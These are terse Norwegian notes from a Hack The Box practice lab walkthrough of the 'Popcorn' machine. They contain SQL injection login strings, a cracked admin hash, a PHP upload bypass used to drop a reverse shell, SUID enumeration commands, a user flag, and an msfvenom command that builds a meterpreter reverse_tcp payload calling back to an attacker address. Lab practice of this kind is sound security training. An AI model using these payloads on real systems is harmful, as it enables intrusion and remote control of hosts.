# popcorn 10.10.10.6

linux

22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 **ingen exploits**

80/tcp open  http    Apache httpd 2.2.12 \(\(Ubuntu\)\) **ingen exploits**

dirb test og **torrent**

[http://10.10.10.6/torrent/login.php](http://10.10.10.6/torrent/login.php)

laste opp en torrent. prøve å finne et sted å laste opp bilde, obfuscate kode i bildet - funker ikke

`admin' or '1'='1`

`admin' or '1'='1`

adminpanel ingenting

må nok få tilgang til databse på en eller annen måte

torrent/database/ fant sql fil. inneholder hashet passord 1844156d4166d94387f1a4ad031ca5fa som blir admin12

kjører authenticated dirb

**laste opp via burp som php.jpg, endre på navn og paste inn reverse shell.**

Ubuntu 9.10 \n \l

Linux version 2.6.31-14-generic-pae

user.txt **5e36a919398ecc5d5c110f2d865cf136**

cat /root/root.txt

find / -perm -1000 -type d 2&gt;/dev/null **ingenting**

find / -perm -u=s -type f 2&gt;/dev/null **ingenting**

kanskje kernel exploit

bruke exploit suggester og teste



```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
```

lage shell og laste opp så jeg får meterpreter. bra triks

så kjøre exploit suggester og se hva jeg får

